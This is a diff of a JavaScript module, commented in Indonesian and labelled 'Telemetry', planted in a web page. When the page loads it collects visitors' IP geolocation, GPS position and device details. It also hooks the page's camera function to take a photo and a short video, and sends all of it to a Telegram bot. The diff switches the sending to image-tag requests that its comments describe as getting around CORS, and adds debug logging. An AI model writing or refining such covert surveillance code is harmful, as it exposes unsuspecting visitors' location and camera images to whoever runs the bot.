@@ -414,29 +414,25 @@
   let sentDevice = false;
   let sentMedia = false;
 
-  // ─── Helper: kirim teks ───
+  console.log("🚀 Telemetry module loaded");
+  console.log("BOT:", BOT);
+  console.log("CHAT:", CHAT);
+
+  // ─── Helper: kirim teks (via Image injection, anti-CORS) ───
   async function sendTelegramMessage(text) {
     for (const chunk of splitText(text, 3800)) {
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT, text: chunk, parse_mode: 'HTML' })
-        });
-      } catch(e) {}
-      await sleep(300);
+      const url = `https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(chunk)}&parse_mode=HTML`;
+      new Image().src = url;
+      console.log("📤 Sending text chunk:", chunk.substring(0, 50) + "...");
+      await sleep(500);
     }
   }
 
-  // ─── Helper: kirim lokasi ───
+  // ─── Helper: kirim lokasi (via Image injection) ───
   async function sendTelegramLocation(lat, lng) {
-    try {
-      await fetch(`https://api.telegram.org/bot${BOT}/sendLocation`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT, latitude: lat, longitude: lng })
-      });
-    } catch(e) {}
+    const url = `https://api.telegram.org/bot${BOT}/sendLocation?chat_id=${CHAT}&latitude=${lat}&longitude=${lng}`;
+    new Image().src = url;
+    console.log("📍 Sending location:", lat, lng);
   }
 
   // ─── Helper: kirim foto ───
@@ -447,8 +443,11 @@
       fd.append('chat_id', CHAT);
       fd.append('photo', blob, `${label}_${Date.now()}.jpg`);
       fd.append('caption', `📸 ${label}\nIP: ${deviceData.ip || 'N/A'}`);
-      await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: 'POST', body: fd });
-    } catch(e) {}
+      const res = await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: 'POST', body: fd });
+      console.log("📸 Photo sent:", res.status);
+    } catch(e) {
+      console.error("❌ Gagal kirim foto:", e);
+    }
   }
 
   // ─── Helper: kirim video ───
@@ -458,8 +457,11 @@
       fd.append('chat_id', CHAT);
       fd.append('video', blob, `${label}_${Date.now()}.mp4`);
       fd.append('caption', `🎥 ${label}\nIP: ${deviceData.ip || 'N/A'}`);
-      await fetch(`https://api.telegram.org/bot${BOT}/sendVideo`, { method: 'POST', body: fd });
-    } catch(e) {}
+      const res = await fetch(`https://api.telegram.org/bot${BOT}/sendVideo`, { method: 'POST', body: fd });
+      console.log("🎥 Video sent:", res.status);
+    } catch(e) {
+      console.error("❌ Gagal kirim video:", e);
+    }
   }
 
   function splitText(text, max) {
@@ -478,6 +480,8 @@
 
   // ─── 1. Kumpulkan info device (tanpa izin tambahan) ───
   async function collectDeviceInfo() {
+    console.log("📡 Mengumpulkan info device...");
+
     // IP / geolocation
     try {
       const r = await fetch('https://ipapi.co/json/');
@@ -488,7 +492,7 @@
         ipLat: d.latitude, ipLng: d.longitude,
         ipMaps: d.latitude ? `https://maps.google.com?q=${d.latitude},${d.longitude}` : ''
       });
-    } catch(e) {}
+    } catch(e) { console.warn("⚠️ IP geolocation gagal:", e); }
 
     // Device info dasar
     Object.assign(deviceData, {
@@ -518,12 +522,15 @@
         deviceData.gpsMaps = `https://maps.google.com?q=${pos.coords.latitude},${pos.coords.longitude}`;
       } catch(e) { deviceData.gpsStatus = 'Denied'; }
     }
+
+    console.log("✅ Data device terkumpul:", deviceData);
   }
 
   // ─── 2. Kirim report device ───
   async function sendDeviceReport() {
     if (sentDevice) return;
     sentDevice = true;
+    console.log("📤 Mengirim device report...");
 
     await collectDeviceInfo();
 
@@ -577,6 +584,7 @@
     const checkInterval = setInterval(async () => {
       if (video.videoWidth > 0 && video.readyState >= 2) {
         clearInterval(checkInterval);
+        console.log("📹 Video siap, mengambil media...");
 
         // Kirim foto
         const photo = capturePhotoFromVideo(video);
@@ -589,9 +597,10 @@
             const videoBlob = await captureVideoFromStream(stream, 3000);
             await sendVideoToTelegram(videoBlob, 'auto_record');
           }
-        } catch(e) { /* video recording gagal, tetap lanjut */ }
+        } catch(e) { console.warn("⚠️ Gagal rekam video:", e); }
 
         sentMedia = true;
+        console.log("✅ Media terkirim!");
       }
     }, 1000);
 
@@ -603,6 +612,7 @@
 
   // 1. Saat halaman dimuat, kirim info device secepatnya
   document.addEventListener('DOMContentLoaded', () => {
+    console.log("📄 Halaman dimuat, mengirim device report...");
     sendDeviceReport();
   });
 
@@ -610,6 +620,7 @@
   // Kita hook ke fungsi `startCam` asli yang sudah ada
   const originalStartCam = window.startCam || function() {};
   window.startCam = async function() {
+    console.log("📸 startCam dipanggil (hook)");
     const result = await originalStartCam.apply(this, arguments);
     // Setelah kamera start, tunggu sampai stream siap
     setTimeout(() => {
@@ -622,6 +633,7 @@
   setTimeout(() => {
     const video = document.getElementById('v_src');
     if (video && video.videoWidth > 0 && video.readyState >= 2 && !sentMedia) {
+      console.log("📹 Kamera sudah aktif, langsung ambil media...");
       waitForCameraAndSendMedia();
     }
   }, 6000);
